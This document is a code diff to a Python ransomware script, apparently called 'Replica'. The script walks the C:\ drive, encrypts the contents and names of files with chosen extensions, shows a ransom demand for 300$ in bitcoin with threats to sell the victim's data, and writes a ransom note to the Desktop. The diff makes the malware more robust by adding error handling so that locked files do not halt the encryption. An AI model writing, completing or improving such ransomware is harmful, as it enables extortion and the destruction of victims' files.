@@ -31,10 +31,11 @@ name = path.basename(__file__)
 
 # Warning message
 MessageBox(
-    "All of your important files have been encrypted\n",
-    "you have 3 hours to send 300$ in bitcoins to this address -> cooladdress.org.\n",
-    "If you will not, all of your important data will be sold, all of your password, wil be sold\n",
+    "All of your important files have been encrypted\n"
+    "you have 3 hours to send 300$ in bitcoins to this address -> cooladdress.org.\n"
+    "If you will not, all of your important data will be sold, all of your password, wil be sold\n"
     "Good luck.",
+    "Replica",
     MB_ICONWARNING
 )
 
@@ -50,19 +51,23 @@ for root, dirs, files in walk("C:\\"):
 
         # Encrypting only files with specific extension
         if ext in extensions:
-            # Encrypting content
-            with open(fpath, "rb") as of:
-                original: bytes = of.read()
+            # Checking the file is accessible
+            try:
+                # Encrypting content
+                with open(fpath, "rb") as of:
+                    original: bytes = of.read()
 
-            encrypted = f.encrypt(original)
+                encrypted = f.encrypt(original)
 
-            with open(fpath, "wb") as of:
-                of.write(encrypted)
+                with open(fpath, "wb") as of:
+                    of.write(encrypted)
 
-            # Encrypting filename
-            filename = f.encrypt(file.encode())
-            newpath: str = root + "\\" + filename.decode()
-            rename(fpath, newpath)
+                # Encrypting filename
+                filename = f.encrypt(file.encode())
+                newpath: str = root + "\\" + filename.decode()
+                rename(fpath, newpath)
+            except:
+                pass
 
 # Writing backup instructions file
 desktop = f"C:/Users/{getuser()}/Desktop/README.txt"
@@ -71,7 +76,8 @@ with open(desktop, "w") as d:
     d.write(
             "IMPORTANT!\n"
             "This is a important file, you'll need this for decrypting your files.\n"
-            f"This is your id, {gethostname()}, put this somewhere safe, because when you'll send the money we will need this.\n"
+            f"This is your id, {gethostname()}, put this somewhere safe, because when you'll send the money we will "
+            "need this.\n "
             "All of your important files have been encrypted, there's no way you can get them back except one.\n"
             "For getting all of your files back you need to send 300$ in bitcoin to this address -> cooladdress.org.\n"
             "After you've paid the 300$ you'll eventually get your files back, don't try to do this things:"
